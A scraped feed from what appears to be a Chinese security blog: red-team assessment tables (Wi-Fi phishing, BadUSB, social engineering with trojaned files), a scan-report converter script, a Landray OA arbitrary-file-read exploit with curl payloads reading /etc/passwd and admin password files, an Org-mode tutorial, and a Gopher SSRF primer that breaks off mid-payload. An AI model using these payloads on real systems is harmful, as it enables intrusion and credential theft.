查看路由器固件版本，使用Nday进行攻击，拿到root权限，监控流量，抓取和修改非HTTPS的数据包 |<br>| Wi-Fi钓鱼            | 创建免费热点，设置认证，使用户收集自动连接Wi-Fi                                         |<br>| WPS攻击              | 路由器开启了WPS功能后，尝试通过物理接触，不需要密码即可连上                             |<br>| 无线协议识别         | 通过查看Wi-Fi类型，判断是否为WEP，WPA2，WPA2-PSK加密类型的Wi-Fi                         |</p><p>*** 集中管控平台专项评估<br>| 评估方法                                                                           | 评估对象                                                             |<br>|————————————————————————————+———————————————————————-|<br>| 针对预控增加配置检查，检车安全设备应用层漏洞、检测安全设备本体安全机制是否存在缺陷 | 云托管平台、终端管理平台、堡垒机、域控、集中开发平台、虚拟化管控平台 |</p><p>*** 安全设备专项评估<br>  | 层面         | 内容                         |<br>  |————–+——————————|<br>  | 应用层漏洞   | 提权等常见漏洞               |<br>  | 本身机制     | HIDS管理页面绕过登陆查看界面 |<br>  | 自有防御     | 登陆认证、权限管控           |<br>  | 安全防护机制 | 策略有效性                   |</p><p>*** 近源专项评估<br>| 评估方法                                                             | 评估对象 |<br>|———————————————————————-+———-|<br>| Wi-Fi钓鱼(模拟内部AP，欺骗员工连入Wi-Fi进行办公，对钓鱼结果进行统计) | Wi-Fi    |<br>| BadUSB(重写USB内部固件，伪装成USB键盘，通过虚拟键盘，输入恶意指令)   | HID      |<br>| 门禁前端伪造(NFC技术复制工牌)                                        | 门禁系统 |<br>| 门禁前端数据伪造(入侵门禁系统修改数据)                               | 门禁系统 |</p><p>*** 社工专项评估<br>| 类型     | 内容                                                                                                   |<br>|———-+——————————————————————————————————–|<br>| 身份伪装 | 模拟高管、需要帮助的职员、正在处理网络问题的技术支持人员、诱导企业员工提供所需信息，对诱导结果进行统计 |<br>| 通信欺骗 | 通过聊天工具搜索目标的群聊，通过伪装员工进入Q群获取信息，进一步开展诈骗，钓鱼等攻击                    |<br>| 组合社工 | 伪装猎头，和特定员工进行交流，在骗取信任后通过微信等聊天工具发送包含恶意木马的文件进一步获取信息       |</p><p>*** 重要(靶标)系统专项评估</p><ol><li><p>自身安全性评估<br>| 纬度             | 详情                                                                     |<br>|——————+————————————————————————–|<br>| 系统架构         | 服务器、中间件等                                                         |<br>| 网络架构         | 安全域划分、隔离、防护措施                                               |<br>| 数据传输         | 输出是否加密、加密是否有效                                               |<br>| 运维管理         | 何种运维方式、管理平台登陆认证、权限管理是否有效、是否有漏洞             |<br>| 安全设备覆盖情况 | 系统所在域及与系统存在访问的区域是否覆盖了安全检测设备，是否实施阻断攻击 |</p></li><li><p>访问途径评估</p><ul><li>基本访问原则(靶标系统与其他系统的访问规则)、访问控制关系</li><li>攻击者可利用攻击路径: 如互联网站点-&gt;DMZ区-&gt;内网-&gt;靶标</li><li>检测攻击路径涉及区域的安全监测、防护设备是否有效</li></ul></li><li><p>运维终端主机专项评估</p><ul><li>应用漏洞盘查（漏扫+手工验证)</li><li>访问途径评估 (ACL规则)</li><li>已有后门排查(杀毒软件、漏扫、HIDS检测)</li></ul></li></ol><p>*** 策略布防与优化<br>布防原则：</p><ul><li>梳理业务流量，保证所有请求流量都在防御体系监控范围内</li><li>核心资产具备纵深防御能力</li><li>设备防御能力合理搭配，防御能力覆盖全面(应用、网络、主机)</li><li>安全策略调优，给策略决策平台提供可信可控的基础数据</li><li>设备特点互相补充，必要时可进行旁路冗余部署</li><li>应急响应流程明确</li></ul><p>布防与加固内容：</p><ul><li>安全产品部署调整</li><li>策略调优和安全加固</li><li>应急响应流程化</li></ul><p>*** 策略覆盖度验证评估<br>策略有效性验证:</p><ul><li><p>常规： 测试策略是否生效，如and 1=1</p></li><li><p>非常规： 基于waf绕过</p></li><li><p>机制本体绕过： 防护机制绕过，不按照规则进行绕过</p><p>覆盖度验证指标<br>| 验证纬度 | 功能                                   |<br>|———-+—————————————-|<br>| 覆盖度   | 设备覆盖范围是否齐全、流量是否全部接入 |<br>| 抗绕过   | 是否还有防护被绕过的情况               |<br>| 抗淹没   | 是否还有误报情况                       |</p></li></ul><p>** 模拟验证<br>*** 红蓝对抗模拟</p><p>*** 反制模拟<br>收集攻击信息-&gt;反向渗透-&gt;攻击取证</p><p>*** 自动化封禁脚本<br>通过搭建SIEM平台或SOC平台，对WAF、全流量设备的日志进行处理，自动转发同步到防火墙上进行IP封禁。</p><p>*** 沙盘演练</p><p>** 实战对抗</p><p>*** 检测与应急(现场值守)</p><p>| 任务 | 工作内容                                                           |<br>|——+——————————————————————–|<br>| 检测 | 分析告警信息(时间、攻击类型、攻击IP、受害IP、攻击次数、检测人员等) |<br>| 分析 | 攻击是否成功，溯源情况描述、处置意见、分析责任人、是否上报等       |<br>| 处置 | 处置措施、封禁IP详情、数量、策略增加详情、处置责任人               |<br>#+TBLFM: </p><p>*** TODO 攻击反制(现场值守)</p><p>*** 情报共享(二线支持)<br>威胁情报包括：</p><ol><li>行业内情报：厂商间互相共享的一些可疑IP，攻击IP，通用漏洞信息等</li><li>前场攻防情报： 演练现场传回一些可疑IP，攻击IP，攻击手法、溯源信息等</li><li>开源威胁情报： 借助互联网上一些开源情报平台，收集、分析可靠情报</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;红蓝对抗&lt;br&gt;组织 &lt;em&gt;多支攻击队伍&lt;/em&gt;  对 &lt;em&gt;各行业重点点位目标系统&lt;/em&gt; </summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Nsfocus2docx.md</title>
    <link href="https://askding.github.io/Kali/Exploit/Nsfocus2docx-md.html"/>
    <id>https://askding.github.io/Kali/Exploit/Nsfocus2docx-md.html</id>
    <published>2021-05-22T16:05:22.000Z</published>
    <updated>2021-05-22T16:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，<br>因此使用python3写了个脚本，使用模块如下</p><ul><li>BeautifulSoup</li><li>docxtpl</li></ul><h2 id="原始报告"><a href="#原始报告" class="headerlink" title="原始报告"></a>原始报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_html.png" alt="html"></p><h2 id="转换成docx报告"><a href="#转换成docx报告" class="headerlink" title="转换成docx报告"></a>转换成docx报告</h2><p><img src="https://raw.githubusercontent.com/askDing/Nsfocus2docx/main/img/nsfocus_docx.png" alt="docx"></p><h2 id="源码Nsfocus2docx"><a href="#源码Nsfocus2docx" class="headerlink" title="源码Nsfocus2docx"></a>源码<a href="https://github.com/askDing/Nsfocus2docx">Nsfocus2docx</a></h2><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-# author: Mr.Frame# Blog: https://askding.github.io/# Dependence:#           BeautifulSoup#           docxtpl# Bugs:#  doc.render(data) 渲染数据时，#  199个漏洞，只能渲染89个，#  1362个漏洞只能渲染出639个import sysimport timefrom bs4 import BeautifulSoupfrom docxtpl import DocxTemplate# 定义漏洞类class Vulner:    def __init__(self, vulnName, ipList, details, threatLevel, solutions):        self.vulnName = vulnName        self.ipList = ipList        self.detail = details        self.threatLevel = threatLevel        self.solution = solutionsdef banner():    if len(sys.argv) != 2:        print(&quot; Usage: python3 main.py  &lt;path/to/index.html&gt;  &quot;)        sys.exit()def generate_docx(path):    data = &#123;&quot;vulners&quot;: []&#125;  # 漏洞数据    soup = BeautifulSoup(open(path), &quot;lxml&quot;)    data[&#39;title&#39;] = soup.h1.string  # 文档标题    generated_dox = data[&#39;title&#39;] + time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()) + &quot;.docx&quot;  # 生成文档名    vuln_table = soup.find(&#39;table&#39;, attrs=&#123;&quot;id&quot;: &quot;vuln_distribution&quot;,                                           &quot;class&quot;: &quot;report_table&quot;&#125;)    # 获取漏洞名列表    vuln_name_list = vuln_table.find_all(&#39;span&#39;)    # 获取每个漏洞名字下展开信息    report_table_list = vuln_table.find_all(&#39;table&#39;, attrs=&#123;&quot;class&quot;: &quot;report_table&quot;&#125;)    vuln_List=[]         # 漏洞名字列表    print(&quot;\n梳理漏洞如下: &quot;)    for vul in vuln_name_list:        vuln_name = vul.get_text().strip()  # 漏洞名列表        print(vuln_name)        vuln_List.append(vuln_name)    vuln_Hosts=[]        # 风险来源列表    Detail_List=[]       # 风险分析列表    Solution_List=[]     # 处置建议列表    ThreatLevel_List=[]  # 风险级别列表    for report_table in report_table_list:        vuln_hosts = report_table.find_all(&quot;td&quot;)[0].get_text()  # 风险来源        vuln_hosts = vuln_hosts.replace(&quot;&amp;nbsp&quot;, &quot;&quot;).replace(&quot;点击查看详情;&quot;, &quot;&quot;)        detail = report_table.find_all(&quot;td&quot;)[1].get_text()  # 风险分析        solution = report_table.find_all(&quot;td&quot;)[2].get_text().strip()  # 处置建议        threatLevel = report_table.find_all(&quot;td&quot;)[3].get_text()  # 风险级别        vuln_Hosts.append(vuln_hosts)        Detail_List.append(detail)        Solution_List.append(solution)        ThreatLevel_List.append(threatLevel)    for i in range(0,len(vuln_List)):        print(i)        data[&#39;vulners&#39;].append(            Vulner(vuln_List[i], vuln_Hosts[i], Detail_List[i], ThreatLevel_List[i], Solution_List[i])        )    print(&quot;文档原始数据生成中...&quot;)    doc = DocxTemplate(&quot;template.docx&quot;)    print(&quot;正在渲染文档数据....&quot;)    doc.render(data)    doc.save(generated_dox)    print(&quot;生成完毕，文档名: &#123;&#125;&quot;.format(generated_dox))if __name__ == &#39;__main__&#39;:    banner()    generate_docx(sys.argv[1])</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre><code class="zsh">python3 Nsfocus2docx  /path/to/NS_report/index.html</code></pre><h2 id="已知Bug"><a href="#已知Bug" class="headerlink" title="已知Bug"></a>已知Bug</h2><p><code>doc.render(data)</code>渲染数据时，</p><ul><li>199个漏洞，只能渲染89个，</li><li>1362个漏洞只能渲染出639个</li></ul><p>欢迎For，PR</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;日常安全扫描场景中，有需要将绿盟的Web漏扫报告(html)转换成docx文档格式的需求，&lt;br&gt;因此使用pyth</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Landray-OA 蓝凌OA custom.jsp页面任意文件读取</title>
    <link href="https://askding.github.io/Kali/Exploit/Landray-OA.html"/>
    <id>https://askding.github.io/Kali/Exploit/Landray-OA.html</id>
    <published>2021-05-13T11:40:49.000Z</published>
    <updated>2021-05-13T11:40:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="蓝凌OA-custom-jsp页面任意文件读取"><a href="#蓝凌OA-custom-jsp页面任意文件读取" class="headerlink" title="蓝凌OA custom.jsp页面任意文件读取"></a>蓝凌OA custom.jsp页面任意文件读取</h1><ul><li>URI: <code>/sys/ui/extend/varkind/custom.jsp</code></li><li>payload: <pre><code class="zsh">var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;file:///etc/passwd&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;</code></pre></li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol><li>查看kmssconfig配置文件<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/kmssconfig.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210513194553landray-oa.png" alt="Landray-OA"></p><ol start="2"><li>查看<code>/admin.do</code>管理员后台密码<pre><code class="zsh">curl -X POST &quot;http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp&quot; -d &#39;var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/WEB-INF/KmssConfig/admin.properties&quot;&#125;&#125;&#39;</code></pre></li></ol><p>解密工具 <a href="https://github.com/zhutougg/LandrayDES">LandrayDES</a></p><pre><code class="zsh">java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt  admin.do S11E7bclfCnWEz/\JLVTdUw==</code></pre><p>参考</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485442&idx=1&sn=18175fcffeb5ccf31507a21f30145ddd&chksm=e869eb6fdf1e62793669c3e91b011034dfa7c11d0af173d9541be384e6606f64be0a93c1d5f5&xtrack=1&scene=90&subscene=93&sessionid=1620912773&clicktime=1620912781&enterid=1620912781&ascene=56&devicetype=android-30&version=28000339&nettype=WIFI&abtest_cookie=AAACAA==&lang=en&exportkey=AUeLnswx+FALMw29vTEa4+g=&pass_ticket=77Y82XyXpJKzg8bEukNk8K1Ac4jfOpASkJgWWfxkZ8QI4Er3daOMJ3T9fBFJHbz2&wx_header=1">X凌OA任意文件读取</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;蓝凌OA-custom-jsp页面任意文件读取&quot;&gt;&lt;a href=&quot;#蓝凌OA-custom-jsp页面</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>org-syntax</title>
    <link href="https://askding.github.io/Evolution/org-syntax.html"/>
    <id>https://askding.github.io/Evolution/org-syntax.html</id>
    <published>2021-05-08T08:59:18.000Z</published>
    <updated>2021-05-08T08:59:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#org1f2e3d0">Org Mode - Your life in plain text</a><ol><li> <a href="#org22e2b21">Metadata</a></li><li> <a href="#orgf520299">Headlines</a></li><li> <a href="#orgca6af80">Markup</a></li><li> <a href="#org08cbd90">Lists</a></li><li> <a href="#org29a3a9a">Links</a></li><li> <a href="#org4616742">Images</a></li><li> <a href="#org51f208e">Blocks</a></li><li> <a href="#org617375d">Table</a></li><li> <a href="#orga1ab3ca">Commnet</a></li><li><a href="#org3561d83">Macros</a></li><li><a href="#org6c0fec9">footnotes</a></li></ol></li></ol><p><a id="org1f2e3d0"></a></p><h1 id="Org-Mode-Your-life-in-plain-text"><a href="#Org-Mode-Your-life-in-plain-text" class="headerlink" title="Org Mode - Your life in plain text"></a>Org Mode - Your life in plain text</h1><p>Org is a highly flexible structured plain text file format, composed of a few simple, yet versatile, structures &#x2013; constructed to be both <strong>simple enough for the novice</strong> and <strong>powerful enough for the expert</strong>.</p><p>Org mode is Emacs major mode for convenient plain text markup,is for </p><ul><li>  keeping notes,</li><li>  maintaining to-do lists,</li><li>  planning projects,</li><li>  authoring documents,</li><li>  computational notebooks,</li><li>  literate programming</li><li>  and more</li></ul><p>in a fast and effective plain text system.</p><p><a id="org22e2b21"></a></p><h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><p>At the start of a file(before the first headline), it’s common to set the title, author and other <strong>export options</strong></p><pre><code>#+title: Example Org File#+author: Mr.Frame#+date: Fri May  7 10:07:35 CST 2021#+startup: overview content showall showeverything nohideblocks  hideblocks</code></pre><p><a id="orgf520299"></a></p><h2 id="Headlines"><a href="#Headlines" class="headerlink" title="Headlines"></a>Headlines</h2><p>Lines that start with an asterisk <code>*</code> are <strong>headlines</strong><br>A single <code>*</code> denotes a 1st-level headline</p><pre><code>* Revamp orgmode.org website** Make screenshots</code></pre><p><a id="orgca6af80"></a></p><h2 id="Markup"><a href="#Markup" class="headerlink" title="Markup"></a>Markup</h2><p>Text markup follows th pattern,  PRE, MARKER, CONTENTS, MARKER and POST are not separated by whitespace characters.<br><code>&lt;Pre&gt;&lt;Marker&gt;&lt;Contents&gt;&lt;Marker&gt;&lt;Post&gt;</code></p><ul><li>  <Pre>: - ( { ' " and whitespace<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>,</li><li>  <Marker>: a character among *(bold), =(verbatim), /(italic), +(strikethrough), _(underline), ~(code)</li><li>  <Post>: <whitespace character>,- . , ; : ! ? ‘ “ ) } [</li><li>  <Contents>: <code>&lt;non-whitespace-character&gt;&lt;any character but may not span over more than 3 lines&gt;&lt;non-whitespace-character&gt;</code></li></ul><table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides"><colgroup><col  class="org-left" /><col  class="org-left" /><col  class="org-left" /></colgroup><thead><tr><th scope="col" class="org-left">Font Style</th><th scope="col" class="org-left">Singal</th><th scope="col" class="org-left">Effect</th></tr></thead><tbody><tr><td class="org-left">Bold</td><td class="org-left"><code>*Bold*</code></td><td class="org-left"><b>Bold</b></td></tr><tr><td class="org-left">Italic</td><td class="org-left"><code>/Italic/</code></td><td class="org-left"><i>Italic</i></td></tr><tr><td class="org-left">Underline</td><td class="org-left"><code>_underline_</code></td><td class="org-left"><span class="underline">underline</span></td></tr><tr><td class="org-left">Strikethrough</td><td class="org-left"><code>+strikethrough+</code></td><td class="org-left"><del>strikethrough</del></td></tr><tr><td class="org-left">code</td><td class="org-left"><code>~code~</code></td><td class="org-left"><code>code</code></td></tr><tr><td class="org-left">verbatim</td><td class="org-left"><code>=verbatim=</code></td><td class="org-left"><code>berbatim</code></td></tr><tr><td class="org-left">Superscripts</td><td class="org-left"><code>R_sun=6.96 x 10^8m</code></td><td class="org-left">R<sub>sun</sub>=6.96 x 10<sup>8m</sup></td></tr><tr><td class="org-left">Subscripts</td><td class="org-left"><code>R_&#123;AlphaCentauri&#125; = 1.28 x R_&#123;sum&#125;</code></td><td class="org-left">R<sub>AlphaCentauri</sub> = 1.28 x R<sub>sum</sub></td></tr></tbody></table><p><a id="org08cbd90"></a></p><h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><p>Unordered lists start with + -<br>Ordered lists start with 1. 1)  A.  A)<br>Unordered and odered bullets can be nested in any order.</p><pre><code>To buy:1. Milk2. Eggs  - Organic3. Cheese  + Parmesan  + MozzarellaLists can contain checkboxes [ ] [-] [X]- [ ] not started- [-] in progress- [X] complete Lists can contain tags (and checkboxes at the same time)- [ ] fruits :: get apples- [X] vegiies :: get carrots</code></pre><p><a id="org29a3a9a"></a></p><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p>put the target between two square brackets,like so: <code>[[type:target]]</code> or <code>[[type:target][desc]]</code><br>same as an html <code>&lt;a&gt;</code> tag <code>&lt;a href=&quot;target&quot;&gt;desc&lt;/a&gt;</code></p><pre><code>[[https://orgmode.org][a nice website]][[file:~/Pictures/dank-emem.png]][[earlier heading][an earlier heading in the document]]</code></pre><p><a id="org4616742"></a></p><h2 id="Images"><a href="#Images" class="headerlink" title="Images"></a>Images</h2><p>Org mode automatically recognizes and renders image links during export.<br>Just link to an image <strong>(don’t include a description)</strong>.   </p><p><code>[[https://upload.wikimedia.org/wikipedia/commons/5/5d/Konigsberg_bridges.png]]</code>  </p><p>Images located on your computer can also be rendered in the Emacs buffer with <strong><code>C-c C-x C-v</code></strong></p><p><a id="org51f208e"></a></p><h2 id="Blocks"><a href="#Blocks" class="headerlink" title="Blocks"></a>Blocks</h2><p>Org mode uses <strong>#+BEGIN</strong> &#x2026; <strong>#+END</strong> blocks for many purposes. </p><pre><code>(defun org-xor (a b)   &quot;Exclusive or.&quot;   (if a (not b) b))</code></pre><p><a id="org617375d"></a></p><h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><pre><code>| Tool         | Literate programming? | Reproducible Research? | Languages ||--------------+-----------------------+------------------------+-----------|| Javadoc      | partial               | no                     | Java      || Haskell .lhs | partial               | no                     | Haskell   || noweb        | yes                   | no                     | any       || Sweave       | partial               | yes                    | R         || Org-mode     | yes                   | yes                    | any       |</code></pre><p><a id="orga1ab3ca"></a></p><h2 id="Commnet"><a href="#Commnet" class="headerlink" title="Commnet"></a>Commnet</h2><ul><li><p>  Line comments start with <strong>#</strong></p></li><li><p>  Inline comments wrap <code>@@comment: like so@@</code></p></li><li><p>  Block comments are wrapped with <strong><code>#+BEGIN_COMMENT</code></strong> and <strong><code>#+END_COMMENT</code></strong></p></li><li><p>Section comments can be created by adding the <strong>COMMENT</strong> keyword to a headline</p><pre><code>    # A line commment    Example of an @@comment: inline@@ comment.</code></pre></li></ul><pre><code>      #+begin_comment      This is a block comment.      It can span multiple line.      As well as other markup.      #+begin_src emacs-lisp      (+ 1 2)      #+end_src      #+end_comment      * A top level headline      ** COMMENT This section and subsections are commented out      *** This headline inherits the =COMMENT= keyword    This text is commented out      ** This headline is not commented</code></pre><p><a id="org3561d83"></a></p><h2 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h2><pre><code>#+macro: attn _*/$1/*_&#123;&#123;&#123;attn(This text gets all the markup!)&#125;&#125;&#125;</code></pre><p><span class="underline"><strong><em>Attention! This text gets all the markup!</em></strong></span> _ this will underline_</p><p><a id="org6c0fec9"></a></p><h2 id="footnotes"><a href="#footnotes" class="headerlink" title="footnotes"></a>footnotes</h2><ul><li><p>  <code>[fn:name:description]</code></p></li><li><p>  <code>[fn::description]</code></p></li><li><p><code>[fn:name2]</code></p><p>  <code>[fn:name2] description</code></p><p>  ** Footnotes<br>  The Org homepage[fn:1] now looks a lot better than it used to.</p><p>  Tom is a boy[fn:name]. </p><p>  Jim is a boy[fn:: This is the inline definition of this footnote] too.</p><p>  Lily is a girl[fn:lily: a definition].</p></li></ul><pre><code>[fn:1] The link is: http://orgmode.org[fn:name] Tom is a boy.</code></pre><h1 id="Footnotes"><a href="#Footnotes" class="headerlink" title="Footnotes"></a>Footnotes</h1><p><sup><a id="fn.1" href="#fnr.1">1</a></sup> \space \tab \enter</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Table-of-Contents&quot;&gt;&lt;a href=&quot;#Table-of-Contents&quot; class=&quot;headerlink&quot; title=&quot;Table of Contents&quot;&gt;&lt;/a&gt;Table of Contents&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a h</summary>
      
    
    
    
    <category term="Evolution" scheme="https://askding.github.io/categories/Evolution/"/>
    
    
  </entry>
  
  <entry>
    <title>Gopher</title>
    <link href="https://askding.github.io/Kali/Exploit/Gopher-md.html"/>
    <id>https://askding.github.io/Kali/Exploit/Gopher-md.html</id>
    <published>2021-05-06T03:04:32.000Z</published>
    <updated>2021-05-06T03:04:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li><a href="#orgb2c70fa">Gopher</a><ol><li> <a href="#org7cb8b1b">发送gopher请求</a></li><li> <a href="#orgd7c10bf">发送GET请求</a></li><li> <a href="#org085483d">发送POST请求</a></li></ol></li></ol><p><a id="orgb2c70fa"></a></p><h1 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h1><pre><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_[TCP/IP数据]  默认端口70</code></pre><p>发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p>gopher会将后面的数据部分发送给相应的端口，<br>这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等<br>，同时数据部分必须要进行**URL编码**，这样gopher协议才能正确解析。</p><p><a id="org7cb8b1b"></a></p><h2 id="发送gopher请求"><a href="#发送gopher请求" class="headerlink" title="发送gopher请求"></a>发送gopher请求</h2><pre><code>curl gopher://www.example.com/path/_[file]curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere</code></pre><p><a id="orgd7c10bf"></a></p><h2 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h2><pre><code>    GET / HTTP/1.1    Host: baidu.com    Upgrade-Insecure-Requests: 1    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgS    Connection: close</code></pre><ol><li><p>URL全编码1次HTTP请求包</p><p> <code>%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6